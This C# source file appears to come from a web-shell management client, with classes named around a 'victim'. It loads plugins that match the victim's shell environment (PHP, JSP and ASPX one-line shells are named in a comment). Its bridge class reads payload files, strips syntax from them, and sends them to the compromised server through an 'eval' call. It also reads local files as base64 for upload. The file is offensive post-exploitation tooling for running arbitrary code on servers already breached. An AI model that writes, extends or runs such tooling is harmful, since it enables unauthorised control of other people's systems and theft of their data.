using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Alien
{
    public class clsfnPlugin
    {
        private clsWeb m_web { get; init; }
        private clsVictim m_victim { get { return m_web.m_victim; } }
        public string m_szPluginsDir { get; init; }

        public clsfnPlugin(clsWeb web, string szDir = "Plugins")
        {
            m_web = web;
            m_szPluginsDir = Path.Combine(Application.StartupPath, szDir);
        }

        public struct stManifest
        {
            [JsonProperty("name")]
            public string szPluginName { get; set; }

            [JsonProperty("version")]
            public string szVersion { get; set; }

            [JsonProperty("author")]
            public string szAuthor { get; set; }

            // ex. PHP/v8.X/OneShell, JSP/NebulaPulsar/DarkMatter, ASPX/JScript/OneShell, etc.
            [JsonProperty("environment")]
            public List<string> lsEnvironment { get; set; }

            [JsonProperty("description")]
            public string szDescription { get; set; }
        }

        public stManifest? fnLoadPluginManifest(string szPluginDirName)
        {
            try
            {
                string szJsonPath = Path.Combine(szPluginDirName, "manifest.json");
                if (!File.Exists(szJsonPath))
                    throw new FileNotFoundException($"Configuration file not found: " + szJsonPath);

                string szJsonContent = File.ReadAllText(szJsonPath);
                stManifest manifest = JsonConvert.DeserializeObject<stManifest>(szJsonContent);

                return manifest;
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                return null;
            }
        }

        public List<stManifest> fnGetPlugins()
        {
            List<stManifest> plugins = new List<stManifest>();

            string szEnv = Path.Combine(Enum.GetName(typeof(enLanguage), m_victim.ShellLanguage), m_victim.ShellMethod, Enum.GetName(typeof(enPayloadType), m_victim.ShellPayloadType)).Replace("\\", "/");

            foreach (string szDir in Directory.GetDirectories(m_szPluginsDir))
            {
                stManifest? manifestResult = fnLoadPluginManifest(Path.GetFileName(szDir));
                if (manifestResult == null || !manifestResult.HasValue)
                    continue;

                var manifest = manifestResult.Value;
                if (!manifest.lsEnvironment.Contains(szEnv))
                    continue;

                plugins.Add(manifest);
            }

            return plugins;
        }

        [ComVisible(true)]
        public class clsBridge
        {
            private clsWeb m_web { get; init; }
            private string m_szEnvironment { get; set; }

            public clsBridge(clsWeb web, string szEnvironment)
            {
                m_web = web;
                m_szEnvironment = szEnvironment;
            }

            public string fnGetShellType()
            {
                return m_szEnvironment;
            }

            public string fnGetPayload(string szDirName, string szEnv, string szName)
            {
                string szPayloadPath = Path.Combine(szDirName, "payloads", szEnv, $"{szName}.{clsWeb.m_dicSuffix[m_web.m_victim.ShellLanguage]}").Replace("/", "\\");
                if (!File.Exists(szPayloadPath))
                    return string.Empty;

                string szPayload = File.ReadAllText(szPayloadPath);

                foreach (string s in clsWeb.m_dicRemoveSyntax[m_web.m_victim.ShellLanguage])
                    szPayload = szPayload.Replace(s, string.Empty);

                return szPayload;
            }

            public string fnReadFileText(string szFilePath)
            {
                if (!File.Exists(szFilePath))
                    return string.Empty;

                return File.ReadAllText(szFilePath);
            }

            public string fnReadFileBytes(string szFilePath)
            {
                if (!File.Exists(szFilePath))
                    return string.Empty;

                return Convert.ToBase64String(File.ReadAllBytes(szFilePath));
            }

            public async Task<string> fnRun(string szJson, string szPayload, string szEnvironment)
            {
                string szResp = await m_web.fnszSendPayload("eval", new string[] { szPayload, szJson });

                return szResp;
            }
        }
    }
}
